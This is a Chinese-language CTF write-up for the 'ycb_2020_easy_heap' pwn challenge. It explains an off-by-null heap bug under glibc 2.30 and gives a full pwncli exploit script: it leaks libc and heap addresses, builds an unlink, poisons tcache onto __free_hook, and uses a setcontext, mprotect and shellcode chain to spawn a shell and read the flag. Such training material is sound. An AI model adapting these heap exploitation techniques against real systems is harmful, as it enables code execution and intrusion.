# ycb_2020_easy_heap



### 总结

高版本的`off by null`不能像之前那样随便地后向合并了，因为对`size`域的检查更加严格。因此，在高版本的`off by null`，利用姿势小结如下：

- 如果有地址泄露，最起码可以泄露出`libc`地址，可以利用`last_remainder`这个指针；如果能泄露出堆地址，直接构造`unlink`即可
- 如果没有地址泄露，可以利用残留地址，进行利用，主要是`largebin`的`fd_nextsize`和`bk_nextsize`，`samllbin`的残留`bk`和`fastbin`的残留`fd`。围绕这几个构造堆重叠。

<!-- more -->

### checksec

![image-20220305232139242](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305232139242.png)

保护全开，使用的`libc`版本为`glibc-2.30.so`。

### 程序分析

这里记录下在`IDA`中`switch table`的修复：

在跳表出点击`edit->other->specify switch idiom`，然后填写基址、跳转的分支个数、`reg`即可。其实简单的程序，不需要修复，看汇编也能看懂。

### 漏洞点

在`edit`分支的明显的`off by null`:

![image-20220305232308482](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305232308482.png)

### 利用思路

由于这题的`add`和`edit`是分开的，那么就有很多残留的指针，就可以用`show`去泄露出来。

因此，本题不需要利用残留的指针即可完成利用。总结利用思路为：

- 利用残留的指针分别泄露出`libc`地址和`heap`地址
- 在堆上构造`unlink`，构造重叠的堆块布局
- 使用`tcachebin poisoning`分配到`__free_hook`
- 最后利用`setcontext`+`orw`读取`flag`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def add(size):
    sla("Choice:", "1")
    sla("Size: ", str(size))


def edit(idx, data):
    sla("Choice:", "2")
    sla("Index: ", str(idx))
    sa("Content: ", data)

def dele(idx):
    sla("Choice:", "3")
    sla("Index: ", str(idx))


def show(idx,n=6):
    sla("Choice:", "4")
    sla("Index: ", str(idx))
    ru("Content: ")
    return rvn(n)


# 泄露libc和堆地址
add(0x410) # 0
add(0x20) # 1
add(0x20) # 2
add(0x4f0) # 3
add(0x10) # 4
add(0x20) # 5

dele(0)
add(0x410) # 0
m = show(0)
libc_base  = u64_ex(m) - 0x1eabe0
log_libc_base_addr(libc_base)
libc.address = libc_base

dele(1)
dele(2)
add(0x28) # 1
m = show(1)
heap_base  = u64_ex(m) - 0x6c0
log_heap_base_addr(heap_base)

add(0x28) # 2
edit(1, p64(heap_base+0x6c0)+0x18 * b"a" + p64(0x50))

edit(2, p64(0)+p64(0x51)+p64(heap_base+0x6f0-0x18)+p64(heap_base+0x6f0-0x10))

dele(3)
add(0x100) # 3

edit(3, flat({0x18:0x31}))

dele(5)
dele(1)

edit(3, flat({0x18:[
    0x31,p64(libc.sym['__free_hook'])[:7]
]}))

add(0x20)
add(0x20) # 5

# 0x0000000000154b90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]

edit(5, p64(libc_base + 0x0000000000154b90))
start_addr = heap_base + 0x2a0
edit(0, flat({
    0: start_addr+0x100,
    0x8:start_addr,
    0x20: libc.sym['setcontext']+61,
    0xa0: start_addr, # rsp
    0xa8: libc.sym.mprotect, # rcx
    0x68: start_addr &~0xfff, # rdi
    0x70: 0x4000,
    0x88: 7,
    0x100: ShellcodeMall.amd64.execveat_bin_sh

}, filler="\x00"))


dele(0)

# 用execveat拿的shell，所以需要用原生命令读取flag
sl("read -r line < /flag;echo $line")

ia()
```

远程打：

![image-20220305233003940](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305233003940.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-03-05-ycb-2020-easy-heap/  

